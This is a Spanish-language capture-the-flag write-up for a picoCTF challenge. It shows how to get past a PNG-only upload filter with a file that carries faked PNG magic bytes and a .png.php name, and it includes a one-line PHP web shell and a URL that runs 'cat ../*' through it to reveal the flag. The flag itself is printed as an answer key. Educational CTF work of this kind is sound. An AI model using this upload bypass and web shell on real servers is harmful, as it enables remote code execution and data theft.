https://play.picoctf.org/practice/challenge/445
## Descripción
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:54904/)!
## Solución
1. Buscamos mas información en el archivo "robots.txt".
2. Subimos un archivo con la extensión y números mágicos simulado que es una imagen adicional con un payload para ejecutar comandos como el siguiente:
```
cat virus.png.php 
PNG
<?php system($_GET['cmd']); ?>

```
2. Después lo buscamos en la siguiente url y le pasamos por parámetro el comando que deseamos ejecutar. En este caso un ```cat ../*``` para listar el contenido de todos los archivos que existan: http://atlas.picoctf.net:61113/uploads/virus.png.php?cmd=cat%20../*

Esto nos arroja la flag: ```picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}```
## Notas adicionales
## Referencias
https://www.youtube.com/watch?v=co8MZmviC1U&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=66

